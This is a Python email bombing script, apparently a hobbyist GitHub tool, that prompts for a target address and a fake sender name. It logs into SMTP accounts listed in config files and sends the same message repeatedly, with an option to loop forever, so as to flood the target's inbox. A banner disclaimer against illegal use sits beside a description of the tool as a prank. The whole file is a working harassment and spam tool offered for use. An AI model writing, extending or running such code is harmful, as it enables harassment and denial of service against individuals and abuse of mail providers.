#used modules --------------
import smtplib, time, os, sys
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import random
#---------------------------



#colours ------------code's--- 
r = "\033[1;31m"
g = "\033[1;32m"
y = "\033[1;33m"
b = "\033[1;34m"
d = "\033[2;37m"
R = "\033[1;41m"
Y = "\033[1;43m"
B = "\033[1;44m"
w = "\033[1;37m"
#------------------------------





#script banner--------------------------
logo = """\033[1;37m

\033[1;37m[!] \033[1;31mThis is use for E-mail Bombing, You can Unlimitedly send !!! BYE :_)
\033[1;37m
┌-=============================   -   
=      \033[1;31m . ┌──────── \033[1;37mVaim-Emsg     -   
=  \033[1;31m .┌───  \033[1;37mB-Hat VaimYT PROJECT   -   \033[34m[✔] https://github.com/VaimpierOfficial    [✔]
\033[1;37m=    E-mail BOMBING TOOL          -   \033[34m[✔]            Version 1.0                 [✔]
\033[1;37m= \033[1;31m . └──── \033[1;37mBY Vaimpier Ritik      -   \033[91m[X] Please Don't Use For illegal Activity  [X]
\033[1;37m= \033[1;31m .     └─── \033[1;37mVERSION 1.0         -
\033[1;37m└-=============================   -

\033[1;31m    
Disclaimer: \033[1;32mthis tool is designed for Prank
	    testing in an authorized simulated cyberattack
	    Attacking targets without prior mutual consent
            is illegal!                                                               
\033[1;37m                                    
\033[97m """

#ALL comment are under tested so ignore him when i update it then its help me out to think better so thanks for using tool
#we will update soon
#we will add spoofing x bombing 
#soon
#by vaimpier ritik
#-------------------------------------------




#script banner fuction---
def banner():
    print(logo)
#------------------------




#menu---------------------------------------------------------------------------
os.system("clear")
banner()
wow=0
tar_email = input(r+"└─"+w+"\033[1;37mEnter Target E-mail: "+r)
fuck = input(r+"└─"+w+"\033[1;37mDo you wanna Unlimitedly [ y / n ]: "+b)
if fuck=='y' or fuck=='Y' or fuck=="yes" or fuck=="Yes":
	wow=1
if fuck=='n' or fuck=='N' or fuck=="No" or fuck=="no":
	count = int(input(r+"..└─"+w+"\033[1;37mHow many you wanna send: "+b))
spoof = input(r+"└─"+w+"\033[1;37mEnter Any Name: "+r)
#-------------------------------------------------------------------------------



#opening reading files------------------
email=open('email.conf', 'r').read()
password=open('pass.conf', 'r').read()
host=open('hosts.conf', 'r').read()
port=open('ports.conf', 'r').read()
Es = open('message.conf', 'r').read()
#---------------------------------------

#spreate value from here---
email = email.split()
password = password.split()
host = host.split()
port = port.split()
#--------------------------


#msg binding-----------
msg = MIMEMultipart()
msg["To"] = tar_email
msg["From"] = str(spoof) +"<Any@gmail.com>"
msg.attach(MIMEText(Es, 'plain'))
#----------------------


#checking file values--
if int(len(email)) == int(len(password)) and int(len(host)) == int(len(port)):
    pass
else:
	os.system("clear")
	for j in range(0, 4):
		err_name = ['baby','ho gya bro','sad life',':(','Something']
		print(r+"└─"+w+"[!]"+r+random.choice(err_name))
#-----------------------



#sending mail------------------------------------------------------
try:
	def vaimpier(email,password,host='smtp.gmail.com',port=587):
		try:
			s = smtplib.SMTP(str(host), int(port))
			s.starttls()
		except:
			print(r+"└─"+w+"[ ✖ ] Failed : "+r+"Put right Host or Port !!! :_)\n")
			exit()
		try:
			s.login(email, password)
		except:
			print(r+"└─"+w+"[ ✖ ] Login Failed : "+r+"Put right Mail or Password or check lessecure apps enable or not !!! :_)\n")
			exit()
		z=0
		if wow==1:
			while(True):
				s.send_message(msg)
				print(r+"└─"+w+"[ ✔ ] Sucess"+r, z+1)
				z=z+1
		else:
			for i in range(0, count):
				s.send_message(msg)
				print(r+"└─"+w+"[ ✔ ] Sucess"+r, i+1)
		s.close()

except:
	os.system("clear")
	for j in range(0, 4):
		err_name = ['baby','Error ho gya bro','sad life',':(','Something']
		print(r+"└─"+w+"[!]"+r+random.choice(err_name))

#-------------------------------------------------------------------



#puting values-----------------------------------------
f = 0
for c in range(0,len(email)):
	vaimpier(email[f],password[f],host[f],port[f])
	f=f+1
#------------------------------------------------------



#my msg -----------------------------------------------
ritik_welcome = [

	'Thanks for using our tool', 
	'Keep using this tool Thanks Brother !!!', 
	'Bye dear :)', 
	'Hope you enjoy with this tool',
	'We are Vaimpier :) Bye',
	'Thankyou so much dear :)',
	'Keep learning keep hacking :)',
	'Bye :) Next Update soon',
	'We have many tools like this subscribe our channel to get more',
	'Have a Good day dear :) ',
	'Vaimpier Ritik says :) Thanks dear Bye :_)'


]


print("\n")
print(r+"└─"+w+"[!] "+r+random.choice(ritik_welcome))
print("\n")

#Thanks for reading until here
#we are vaimpier solo
#we will add more soon :3
#bye
#--------------------------------------------------------